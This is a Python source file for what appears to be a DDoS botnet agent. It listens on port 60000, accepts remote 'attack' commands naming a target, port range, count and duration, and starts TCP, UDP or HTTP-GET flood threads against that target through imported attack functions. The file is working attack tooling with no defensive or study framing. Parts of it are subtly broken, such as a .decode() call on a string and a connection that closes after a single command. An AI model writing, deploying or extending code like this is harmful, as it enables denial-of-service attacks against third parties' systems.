from utils.socks import tcpAttack , udpAttack , httpAttack
from utils.socks import Server,Log
from threading import Thread
from utils import attacks 
import socket
import time 

class SlaveServer(Server) :
    def handle_io(self,cl,addr) :
        client = cl 

        while True :
            cmd = client.recv(self.ReadBuffer).decode()
            print(f"Command {cmd}")
            if cmd == "ping" :
                print(Log("Ping Check"))

            elif cmd == "kill" :
                print(Log("Kill Code Received"))
                print(Log("Slave Exiting"))
                self.running = False

            elif cmd[:6] == 'attack' :
                cmd , target ,port , count ,duration, aType = cmd.split(':')

                count = int(count)
                duration = int(duration)
                aType = attacks[aType]
                portRange = list(map(int,port.split('-')))
                portRange[1] += 1

                print(f"Attack {cmd} {target} {portRange} {count} {aType}")
                if aType == 'TCP' :
                    portThreads = []
                    for port in range(*portRange) :
                        portThreads.append(Thread(target=tcpAttack,args=(target,port,count,duration,)))
                    for thread in portThreads :
                        thread.start()
                        thread.join()
                    
                elif aType == 'UDP' : 
                    portThreads = []
                    for port in range(*portRange) :
                        portThreads.append(Thread(target=udpAttack,args=(target,port,count,duration,)))
                    for thread in portThreads :
                        thread.start()
                        thread.join()

                elif aType == 'HTTP-GET' :
                    if portRange == [1,65536] :
                        port = 80
                    else :
                        port = portRange[0]
                    httpAttack(target,port,count,duration)

                else :
                    print(Log("Unknown Attack"))
                print(Log("Executed"))
            else :
                try :
                    client.send(">>> ".encode())
                    client.send(cmd.encode())
                    if 'exit' in cmd.decode() :
                        client.close()
                        break
                except OSError :
                    print(Log("OSError {}".format(addr)))
                    client.close()
                    break
                except BaseException as e :
                    print(Log("{} cause by {}".format(e,addr)))
                    break
                finally :
                    print(Log("Connection with {} terminated".format(addr)))
            client.close()
            return

    def http_get(self) :
        pass

slave = SlaveServer(addr=("0.0.0.0",60000))
slave.start()